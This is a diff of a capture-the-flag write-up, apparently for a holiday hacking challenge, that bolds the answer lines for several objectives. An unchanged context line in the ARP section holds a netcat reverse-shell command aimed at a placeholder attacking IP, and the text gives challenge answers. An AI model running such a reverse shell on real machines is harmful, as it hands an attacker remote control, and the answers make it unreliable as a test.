@@ -14,6 +14,9 @@ There is a photo of Santa's Desk on that billboard with his personal gift list. 
 - I used the tool suggested in the hint. Took several attempts at twirling and untwirling before I could see what was on the list for him.
 - Once I saw what was on the list, I read it as "poxmark", but had no idea if this was a thing, so I googled it. YUP! A very interesting thing at that. :)
 
+**Answer:** "poxmark"
+
+
 ## Objective 2: Investigate S3 Bucket
 
 When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.
@@ -32,7 +35,9 @@ When you unwrap the over-wrapped file, what text string is inside the package? T
 - Step 6: "xz -d package.txt.Z.xz"
 - Step 7: "uncompress package.txt.Z"
 - Step 8: "cat package.txt"
-- Step 9: Find the answer! ---> "North Pole: The Frostiest Place on Earth"
+
+
+**Answer:** "North Pole: The Frostiest Place on Earth"
 
 ## Objective 3: Point-of-Sale Password Recovery
 
@@ -51,8 +56,11 @@ Help Sugarplum Mary in the Courtyard find the supervisor password for the point-
 
 - Step 6: Review unpacked source code and then "cat README.md"
 	- "cat README.md" ---> "Remember, if you need to change Santa's passwords, it's at the top of main.js!"
-- Step 7: Find the answer! ---> "santapass"
+
+**Answer:** "santapass"
+
 ~~~
+
 main.js
 // Modules to control application life and create native browser window
 const { app, BrowserWindow, ipcMain } = require('electron');
@@ -191,7 +199,8 @@ According to x509 certificate events captured by Zeek (formerly Bro), what is th
 - Step 3: Go to CyberChef and see what I need. A Passphrase.
 - Step 4: Alice says I need to watch Splunk talk.
 	- Passphrase is "Stay Frosty"
-- Answer: "The Lollipop Guild"
+
+**Answer:** "The Lollipop Guild"
 
 ## Objective 7: Solve the Sleight's CAN-D-BUS Problem
 
@@ -317,7 +326,7 @@ Here's the result!
 
 ![](screenshots/tag-generator-env-response.png)
 
-Answer: "JackFrostWasHere"
+**Answer:** "JackFrostWasHere"
 
 ## Objective 9: ARP Shenanigans
 
@@ -416,7 +425,7 @@ nc -e /bin/sh [attacking ip] 4444
 - Step 13: Navigate to file contents in question:
 	- "cat *.txt | grep recused"
 
-Answer: "Tanta Kringle"
+**Answer:** "Tanta Kringle"
 
 ## Objective 10: Defeat Fingerprint Sensor
 
